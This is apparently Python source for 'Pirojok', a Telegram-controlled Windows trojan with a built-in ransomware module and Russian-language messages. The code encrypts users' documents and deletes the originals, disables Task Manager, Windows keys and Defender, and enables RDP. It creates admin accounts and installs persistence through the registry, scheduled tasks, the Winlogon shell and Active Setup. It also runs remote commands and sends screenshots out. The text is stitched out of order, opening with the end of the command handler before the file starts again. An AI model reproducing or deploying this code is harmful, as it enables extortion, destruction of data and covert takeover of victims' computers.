• info - system info
                """
                self.send_message(chat_id, help_text)
                self.processing = False
                return
            
            # === MASQUERADE COMMANDS ===
            if text == "mask_status":
                self.send_message(chat_id, self.hider.get_mask_status())
                self.processing = False
                return
            
            if text == "mask_remove":
                self.send_message(chat_id, "[MASK] Removing masquerade...")
                self.hider.remove_masks()
                self.processing = False
                return
            
            if text == "inject":
                result = self.hider.inject_into_system()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "watchdog":
                result = self.hider.setup_watchdog()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === RANSOMWARE COMMANDS ===
            if text == "ransom" or text == "ransom_start":
                result = self.ransomware_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "ransom_key":
                result = self.ransomware_key()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("ransom_decrypt"):
                parts = text.split()
                if len(parts) == 2:
                    result = self.ransomware_decrypt(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: ransom_decrypt <key>")
                self.processing = False
                return
            
            # === BASIC COMMANDS ===
            if text == "shot":
                self.send_message(chat_id, "[CAM] Taking screenshot...")
                screenshot = self.take_screenshot()
                if screenshot:
                    self.send_photo(chat_id, screenshot, "[SCREEN] Screenshot")
                else:
                    self.send_message(chat_id, "[ERROR] Failed to take screenshot")
                self.processing = False
                return
            
            if text == "info":
                self.send_message(chat_id, self.get_system_info())
                self.processing = False
                return
            
            if text == "admin":
                if self.admin_mode:
                    self.send_message(chat_id, "[ADMIN] Already have admin rights!")
                else:
                    self.send_message(chat_id, "[ADMIN] Requesting rights...")
                    result = self.request_admin()
                    if result:
                        self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "admin_check":
                status = "YES" if self.admin_mode else "NO"
                self.send_message(chat_id, f"[ADMIN] Admin rights: {status}")
                self.processing = False
                return
            
            if text.startswith("cmd"):
                cmd = text[3:].strip()
                if cmd:
                    self.send_message(chat_id, f"[CMD] Executing: {cmd}")
                    result = self.execute_command(cmd)
                    self.send_message(chat_id, f"{result[:3500]}")
                else:
                    self.send_message(chat_id, "[ERROR] Use: cmd <command>")
                self.processing = False
                return
            
            if text.startswith("website"):
                url = text[7:].strip()
                if url:
                    result = self.open_website(url)
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: website <url>")
                self.processing = False
                return
            
            if text == "enable_rdp":
                result = self.enable_rdp()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "disable_defender":
                result = self.disable_defender()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("add_rule"):
                parts = text.split()
                if len(parts) >= 2:
                    port = parts[1]
                    name = parts[2] if len(parts) > 2 else "Pirojok"
                    result = self.add_firewall_rule(port, name)
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "[ERROR] Use: add_rule <port> [name]")
                self.processing = False
                return
            
            # === STARTUP COMMANDS ===
            if text == "startup_reg":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    key = winreg.HKEY_CURRENT_USER
                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
                    self.send_message(chat_id, "[OK] Added to registry")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "startup_folder":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    startup_folder = os.path.join(os.getenv('APPDATA'),
                        r'Microsoft\Windows\Start Menu\Programs\Startup')
                    vbs_script = f'''
                    Set oWS = WScript.CreateObject("WScript.Shell")
                    sLinkFile = "{startup_folder}\\Pirojok.lnk"
                    Set oLink = oWS.CreateShortcut(sLinkFile)
                    oLink.TargetPath = "{exe_path}"
                    oLink.Save
                    '''
                    vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
                    with open(vbs_path, 'w') as f:
                        f.write(vbs_script)
                    subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
                    os.remove(vbs_path)
                    self.send_message(chat_id, "[OK] Added to startup folder")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "task_logon":
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    task_name = "PirojokLogon"
                    cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                           '/sc', 'onlogon', '/rl', 'highest', '/f']
                    subprocess.run(cmd, capture_output=True)
                    self.send_message(chat_id, "[OK] Added to task scheduler (logon)")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "task_startup" and self.admin_mode:
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    task_name = "PirojokSystem"
                    cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                           '/sc', 'onstart', '/ru', 'SYSTEM', '/rl', 'highest', '/f']
                    subprocess.run(cmd, capture_output=True)
                    self.send_message(chat_id, "[OK] Added to task scheduler (system)")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "explorer_shell" and self.admin_mode:
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                    key = winreg.HKEY_LOCAL_MACHINE
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                        try:
                            current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
                        except:
                            current_shell = "explorer.exe"
                        if exe_path not in current_shell:
                            new_shell = f"{exe_path}, {current_shell}"
                            winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
                    self.send_message(chat_id, "[OK] Added to explorer shell")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "active_setup" and self.admin_mode:
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    guid = str(uuid.uuid4())
                    key_path = f"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}"
                    key = winreg.HKEY_LOCAL_MACHINE
                    with winreg.CreateKey(key, key_path) as regkey:
                        winreg.SetValueEx(regkey, "StubPath", 0, winreg.REG_SZ, f'"{exe_path}"')
                        winreg.SetValueEx(regkey, "Version", 0, winreg.REG_SZ, "1,0,0,0")
                    self.send_message(chat_id, "[OK] Added to Active Setup")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "startup_remove_all":
                result = self.remove_all_startup()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === POWER COMMANDS ===
            if text == "shutdown_now":
                result = self.shutdown_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "reboot_now":
                result = self.reboot_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "shutdown_emergency":
                result = self.shutdown_emergency()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "shutdown":
                result = self.shutdown_delayed()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "reboot":
                result = self.reboot_delayed()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "abort":
                result = self.abort_shutdown()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            self.send_message(chat_id, f"[ERROR] Unknown command: '{text}'. Use help")
            self.processing = False
        except Exception as e:
            print(f"Error: {e}")
            self.processing = False
    
    def main_loop(self):
        self.on_system_startup()
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {"offset": self.last_update_id + 1, "timeout": 30, "allowed_updates": ["message"]}
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(target=self.process_command,
                                args=(update["message"]["text"], update["message"]["chat"]["id"]))
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        try:
            self.admin_mode = self.check_admin()
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "[PIROJOK] Stopped")

if __name__ == "__main__":
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    pirojok = Pirojok()
    pirojok.run()#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Пирожок - ПОЛНОЦЕННЫЙ ВЫМОГАТЕЛЬ
Версия 4.5 - С ИСПРАВЛЕННОЙ КОДИРОВКОЙ UTF-8
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image
import io
import ctypes
import winreg
import tempfile
import uuid
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Конфигурация
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class PirojokRansomware:
    def __init__(self, parent):
        self.p = parent
        self.encryption_key = None
        self.encrypted_files = []
        self.ransom_note = "README_PIROJOK.txt"
        self.cmd_window = None
        self.active = False
        self.target_extensions = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.db', '.sql', '.mdb', '.accdb',
            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js']
        self.exclude_dirs = ['windows', 'winnt', 'program files', 'program files (x86)',
            'boot', 'system32', 'system', '$recycle.bin']
        
    def generate_key(self):
        self.encryption_key = os.urandom(32)
        return base64.b64encode(self.encryption_key).decode()
    
    def show_cmd_message(self):
        try:
            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_msg.bat")
            message = """
╔══════════════════════════════════════════════════════════════╗
║                     🥷 ПИРОЖОК ВЫМОГАТЕЛЬ                     ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ!                              ║
║                                                              ║
║   Для восстановления читайте README_PIROJOK.txt             ║
║   на рабочем столе                                           ║
║                                                              ║
║   КЛАВИШИ F1-F12, ESC, SHIFT, CTRL ЗАБЛОКИРОВАНЫ!           ║
║                                                              ║
║   Для разблокировки введите ключ в Telegram бота             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
            """
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'''@echo off
title ПИРОЖОК ВЫМОГАТЕЛЬ
color 0C
mode con cols=70 lines=20
echo {message}
echo.
echo КЛЮЧ ДЛЯ РАСШИФРОВКИ ОТПРАВЛЕН В TELEGRAM
echo.
pause > nul
''')
            self.cmd_window = subprocess.Popen(
                ['cmd', '/c', 'start', '/min', 'cmd', '/c', bat_path],
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            time.sleep(1)
            os.system(f'start /max cmd /c "{bat_path}"')
        except Exception as e:
            print(f"Ошибка показа CMD: {e}")
    
    def block_all_keys(self):
        try:
            import ctypes
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
            except: pass
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            except: pass
            user32 = ctypes.windll.user32
            user32.SystemParametersInfoW(0x0097, 1, None, 0)
            self.active = True
            return True
        except Exception as e:
            print(f"Ошибка блокировки клавиш: {e}")
            return False
    
    def encrypt_file(self, filepath):
        try:
            iv = os.urandom(16)
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            with open(filepath, 'rb') as f:
                file_data = f.read()
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            encrypted_path = filepath + '.pirojok'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + encrypted_data)
            os.remove(filepath)
            return encrypted_path
        except: return None
    
    def scan_and_encrypt(self):
        if not self.encryption_key:
            self.generate_key()
        root_paths = [os.path.expanduser("~\\Desktop"), os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Pictures"), os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music"), os.path.expanduser("~\\Downloads")]
        encrypted = []
        file_count = 0
        max_files = 50
        for root_path in root_paths:
            if not os.path.exists(root_path): continue
            for root, dirs, files in os.walk(root_path):
                skip = False
                for exclude in self.exclude_dirs:
                    if exclude in root.lower():
                        skip = True
                        break
                if skip: continue
                for file in files:
                    if file_count >= max_files: break
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    if ext in self.target_extensions and not file.endswith('.pirojok'):
                        result = self.encrypt_file(file_path)
                        if result:
                            encrypted.append(file_path)
                            self.encrypted_files.append(result)
                            file_count += 1
                            if file_count % 10 == 0:
                                self.p.send_message(self.p.owner_id, f"🔒 Зашифровано {file_count} файлов...")
                if file_count >= max_files: break
            if file_count >= max_files: break
        return encrypted
    
    def create_ransom_note(self):
        note_path = os.path.join(os.path.expanduser("~\\Desktop"), self.ransom_note)
        key_b64 = base64.b64encode(self.encryption_key).decode()
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                     🥷 ПИРОЖОК ВЫМОГАТЕЛЬ                     ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   Ваши файлы были зашифрованы!                              ║
║                                                              ║
║   Всего зашифровано: {len(self.encrypted_files)} файлов      ║
║                                                              ║
║   Для восстановления используйте ключ:                      ║
║   {key_b64}                                                  ║
║                                                              ║
║   Отправьте команду в Telegram:                             ║
║   ransom_decrypt {key_b64}                                   ║
║                                                              ║
║   Клавиши F1-F12, ESC, SHIFT, CTRL ЗАБЛОКИРОВАНЫ!           ║
║   Для разблокировки введите правильный ключ                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note)
        return note_path
    
    def start_ransomware(self):
        try:
            self.p.send_message(self.p.owner_id, "🔒 Запускаю ransomware...")
            self.block_all_keys()
            self.p.send_message(self.p.owner_id, "🔒 Клавиши заблокированы!")
            self.show_cmd_message()
            self.p.send_message(self.p.owner_id, "📟 CMD сообщение показано!")
            encrypted = self.scan_and_encrypt()
            note = self.create_ransom_note()
            os.startfile(note)
            self.p.add_all_startup_methods()
            result = f"✅ Зашифровано {len(encrypted)} файлов\n"
            result += f"📝 Записка: {note}\n"
            result += f"🔑 Ключ: {base64.b64encode(self.encryption_key).decode()}\n"
            result += f"🔒 Клавиши заблокированы!\n"
            result += f"🔄 Автозапуск установлен!"
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def decrypt_all(self, key_b64):
        try:
            self.encryption_key = base64.b64decode(key_b64)
            pirojok_files = []
            for root, dirs, files in os.walk("C:\\Users"):
                for file in files:
                    if file.endswith('.pirojok'):
                        pirojok_files.append(os.path.join(root, file))
            decrypted = 0
            for file in pirojok_files:
                try:
                    with open(file, 'rb') as f:
                        iv = f.read(16)
                        encrypted_data = f.read()
                    cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                    original_path = file.replace('.pirojok', '')
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)
                    os.remove(file)
                    decrypted += 1
                except: pass
            if decrypted > 0:
                self.unblock_keys()
                self.remove_cmd_message()
                self.p.remove_all_startup()
                self.active = False
            return f"✅ Расшифровано {decrypted} файлов"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def unblock_keys(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            try:
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            except: pass
            self.p.send_message(self.p.owner_id, "🔓 Клавиши разблокированы!")
        except: pass
    
    def remove_cmd_message(self):
        try:
            if self.cmd_window:
                self.cmd_window.terminate()
            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq ПИРОЖОК*"')
        except: pass


class Pirojok:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "4.5.0"
        self.command_timeout = 60
        self.admin_mode = False
        self.startup_time = datetime.now()
        self.processing = False
        self.started = False
        
        self.ransom = PirojokRansomware(self)
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
        self.admin_mode = self.check_admin()
        print(f"Права при запуске: {'Админ' if self.admin_mode else 'Пользователь'}")
        
    def check_admin(self):
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except: return False
    
    def request_admin(self):
        try:
            if self.check_admin():
                self.admin_mode = True
                return "👑 Уже есть права администратора!"
            if platform.system() != "Windows":
                return "❌ Запрос прав только для Windows"
            if getattr(sys, 'frozen', False):
                executable = sys.executable
            else:
                executable = sys.executable + ' "' + os.path.abspath(__file__) + '"'
            with open(self.marker_file, 'w') as f:
                f.write(f"admin_requested:{datetime.now().isoformat()}")
            self.send_message(self.owner_id, "👑 Запрашиваю права администратора...")
            result = ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
            if result > 32:
                self.send_message(self.owner_id, "👑 Перезапуск с правами администратора...")
                time.sleep(2)
                sys.exit(0)
            else:
                self.send_message(self.owner_id, f"❌ Не удалось получить права (код: {result})")
                return "❌ Ошибка получения прав"
        except Exception as e:
            self.send_message(self.owner_id, f"❌ Ошибка запроса прав: {e}")
            return f"❌ Ошибка: {e}"
    
    def run_as_admin_command(self, command):
        try:
            if not self.admin_mode:
                return "❌ Нет прав администратора. Используйте 'admin' сначала"
            if platform.system() == "Windows":
                process = subprocess.Popen(f'cmd /c {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    text=True, encoding='cp866', errors='ignore')
            else:
                process = subprocess.Popen(f'sudo {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
            self.processes.append(process)
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            result = ""
            if stdout: result += f"✅ Результат:\n{stdout}\n"
            if stderr: result += f"⚠️ Ошибки:\n{stderr}\n"
            return result or "✅ Команда выполнена"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def create_admin_user(self, username, password):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
            result = self.run_as_admin_command(cmd)
            return f"👤 Создан пользователь {username}\n{result}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def enable_rdp(self):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            commands = [
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                'sc config TermService start= auto',
                'net start TermService'
            ]
            for cmd in commands:
                self.run_as_admin_command(cmd)
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"✅ RDP включен\nIP: {ip}\nПорт: 3389"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def disable_defender(self):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            ]
            for cmd in commands:
                self.run_as_admin_command(cmd)
            return "✅ Windows Defender отключен"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_firewall_rule(self, port, name="Pirojok"):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
            self.run_as_admin_command(cmd)
            return f"✅ Правило добавлено для порта {port}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def ransomware_start(self):
        try:
            if not self.admin_mode:
                return "❌ Для ransomware нужны права администратора"
            result = self.ransom.start_ransomware()
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def ransomware_key(self):
        try:
            if self.ransom.encryption_key:
                key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
                return f"🔑 Ключ шифрования: {key_b64}"
            else:
                return "❌ Ключ не сгенерирован (сначала запустите ransomware)"
        except Exception as e:
            return f"❌ Ошибка получения ключа: {e}"
    
    def ransomware_decrypt(self, key_b64):
        try:
            result = self.ransom.decrypt_all(key_b64)
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_all_startup_methods(self):
        results = []
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
            results.append("✅ Реестр HKCU")
        except: results.append("❌ Реестр HKCU")
        return results
    
    def remove_all_startup(self):
        results = []
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "Pirojok")
            results.append("✅ Удалено из реестра")
        except: results.append("❌ Не найдено в реестре")
        return "\n".join(results)
    
    def send_message(self, chat_id, text):
        """Отправка сообщения с правильной кодировкой UTF-8"""
        try:
            # Принудительно преобразуем в UTF-8
            if isinstance(text, str):
                text = text.encode('utf-8', errors='ignore').decode('utf-8')
            
            timestamp = datetime.now().strftime('%H:%M:%S')
            text_with_time = f"[{timestamp}] {text}"
            
            url = f"{self.base_url}/sendMessage"
            
            # Отправляем как JSON с явной кодировкой
            data = {
                "chat_id": chat_id,
                "text": text_with_time,
                "parse_mode": "HTML"
            }
            
            headers = {'Content-Type': 'application/json; charset=utf-8'}
            
            response = requests.post(url, json=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"✅ Отправлено: {text[:30]}...")
            else:
                print(f"❌ Ошибка {response.status_code}: {response.text}")
                
        except Exception as e:
            print(f"❌ Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        try:
            if isinstance(caption, str):
                caption = caption.encode('utf-8', errors='ignore').decode('utf-8')
            
            timestamp = datetime.now().strftime('%H:%M:%S')
            caption_with_time = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendPhoto"
            
            files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
            data = {"chat_id": chat_id, "caption": caption_with_time}
            
            response = requests.post(url, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                print(f"✅ Фото отправлено: {caption[:30]}...")
            else:
                print(f"❌ Ошибка отправки фото: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Photo error: {e}")
    
    def get_system_info(self):
        info = []
        info.append(f"🥧 <b>ПИРОЖОК ИСПЕКСЯ!</b>")
        info.append(f"🍽 Версия: {self.version}")
        info.append(f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"💻 Хост: {socket.gethostname()}")
        info.append(f"👨‍🍳 Повар: {getpass.getuser()}")
        info.append(f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}")
        try:
            info.append(f"📍 IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"📍 IP: неизвестен")
        info.append(f"⚙️ ОС: {platform.system()} {platform.release()}")
        uptime = datetime.now() - self.startup_time
        info.append(f"⏱ Работаю: {str(uptime).split('.')[0]}")
        return "\n".join(info)
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except: return None
    
    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                process = subprocess.Popen(f'cmd /c {command}', shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                    text=True, encoding='cp866', errors='ignore')
            else:
                process = subprocess.Popen(command, shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
            self.processes.append(process)
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            result = ""
            if stdout:
                stdout = stdout.encode('utf-8', errors='ignore').decode('utf-8')
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                stderr = stderr.encode('utf-8', errors='ignore').decode('utf-8')
                result += f"⚠️ Ошибки:\n{stderr}\n"
            return result or "✅ Команда выполнена"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def shutdown_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /f /t 0")
            else: os.system("shutdown -h now")
            return "💥 Выключаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def reboot_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /f /t 0")
            else: os.system("reboot -f")
            return "⚡ Перезагружаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def shutdown_emergency(self):
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            os.system("taskkill /f /im *")
            os.system("shutdown /s /f /t 0")
            return "☠️ АВАРИЙНОЕ ВЫКЛЮЧЕНИЕ!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def on_system_startup(self):
        try:
            if os.path.exists(self.marker_file):
                os.remove(self.marker_file)
                return
            if self.started: return
            self.started = True
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"🥧 <b>Пирожок испекся!</b>\n\n"
            message += f"📅 Время включения: {boot_time}\n"
            message += f"💻 Хост: {socket.gethostname()}\n"
            message += f"👤 Пользователь: {getpass.getuser()}\n"
            message += f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}\n"
            self.send_message(self.owner_id, message)
            time.sleep(5)
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "🥧 Рабочий стол после включения")
        except Exception as e:
            print(f"Startup error: {e}")
    
    def process_command(self, text, chat_id):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "⛔ Не для вас!")
            return
        print(f"Получена команда: {text}")
        if self.processing:
            print("Уже обрабатываю команду, пропускаю...")
            return
        self.processing = True
        try:
            current_admin = self.check_admin()
            if current_admin != self.admin_mode:
                self.admin_mode = current_admin
                print(f"Права изменились: {'Админ' if self.admin_mode else 'Пользователь'}")
            admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                             "add_rule", "ransom", "ransom_start", "ransom_key", "ransom_decrypt"]
            cmd_type = text.split()[0] if text else ""
            if cmd_type in admin_commands and not self.admin_mode:
                self.send_message(chat_id, "👑 Эта команда требует прав администратора. Сначала используйте 'admin'")
                self.processing = False
                return
            if text == "help" or text == "menu":
                help_text = """
🥧 <b>ПИРОЖОК V4.5 - МЕНЮ</b>

<b>🔒 RANSOMWARE:</b>
• ransom - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
• ransom_key - показать ключ
• ransom_decrypt <key> - расшифровать

<b>⚡ МОМЕНТАЛЬНО:</b>
• shutdown_now - выключить
• reboot_now - перезагрузить

<b>👑 АДМИН-КОМАНДЫ:</b>
• admin - запросить права
• admin_check - проверить права
